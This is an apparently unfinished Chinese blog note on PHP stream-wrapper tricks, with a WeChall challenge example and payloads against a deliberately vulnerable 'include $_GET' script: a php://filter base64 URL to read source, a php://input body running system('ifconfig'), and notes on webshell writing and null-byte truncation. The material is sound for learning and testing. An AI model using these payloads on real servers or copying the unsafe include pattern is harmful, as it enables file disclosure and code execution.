#php伪协议安全小结（更新中）
>PHP 带有很多内置 URL 风格的封装协议，可用于类似 fopen()、 copy()、 file_exists() 和 filesize() 的文件系统函数。 除了这些封装协议，还能通过 stream_wrapper_register() 来注册自定义的封装协议。

1. **file:// — 访问本地文件系统**
这里以wechall上的challenge为例：
[http://www.wechall.net/challenge/crappyshare/index.php](http://www.wechall.net/challenge/crappyshare/index.php)
[http://www.wechall.net/challenge/crappyshare/index.php?show=code](http://www.wechall.net/challenge/crappyshare/index.php?show=code)
[http://www.wechall.net/challenge/crappyshare/crappyshare.php](http://www.wechall.net/challenge/crappyshare/crappyshare.php)
```php
<?php
function upload_please_by_url($url)
{ 
　　if (1 === preg_match('#^[a-z]{3,5}://#', $url)) # Is URL? 
　　{
　　　　$ch = curl_init($url);
　　　　curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
　　　　curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
　　　　curl_setopt($ch, CURLOPT_FAILONERROR, true);
　　　　if (false === ($file_data = curl_exec($ch)))
　　　　{
　　　　　　htmlDisplayError('cURL failed.');
　　　　}
　　　　else
　　　　{
　　　　　　// Thanks
　　　　　　upload_please_thx($file_data);
　　　　}
　　}
　　else
　　{
　　　　htmlDisplayError('Your URL looks errorneous.');
　　}
}
function upload_please_thx($file_data)
{
        htmlTitleBox('Thank You For Uploading:', '<div class="thx_result">'.nl2br(htmlspecialchars(substr($file_data,0, 1024)).'</div>'));
}
?>
```
可以看出这里有允许url上传的函数，其判断是否为url的函数正中这种伪协议的下怀，从而达到越权访问文件
2. **php://filter -- 对本地磁盘文件进行读写**
```php
<?php include $_GET['id'];?>
```
国外的大触发现通过base64编码后就可以不进行文件包含的操作，而是将文件编码后的内容打印出来
```url
http://127.0.0.1/test/phpfilter/index.php?id=php://filter/read=convert.base64-encode/resource=index.php
```
p师傅对这条伪协议在xxe读php等文件和写webshell时绕过死亡exit时，有着独到的见解，非常吊-[https://www.leavesongs.com/PENETRATION/php-filter-magic.html](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)
写入文件
```php
<?php
　　/* 这会通过 rot13 过滤器筛选出字符 "Hello World"
　　然后写入当前目录下的 example.txt */
　　file_put_contents("php://filter/write=string.rot13/resource=example.txt","Hello World");
?>
```

3. **php:// — 访问各个输入/输出流(I/O streams)**
**php://input 是个可以访问请求的原始数据的只读流(这个原始数据指的是POST数据)**
allow_url_include需设置为on
```php
http://127.0.0.1/test/phpfilter/index.php?id=php://input
<?php system('ifconfig');?>
```
这样可以执行我们的php代码并返回了
更多其他的留可以参考[http://www.cnblogs.com/LittleHann/p/3665062.html](http://www.cnblogs.com/LittleHann/p/3665062.html)

4. **data://伪协议**
这是一种数据流封装器，data:URI schema(URL schema可以是很多形式)
利用data://伪协议进行代码执行的思路原理和php://是类似的，都是利用了PHP中的流的概念，将原本的include的文件流重定向到了用户可控制的输入流中

**参考**：文中出现的外链都是
有点乱，还在更新中
?,00截断条件php小于5.3.4
magic_quotes_gpc off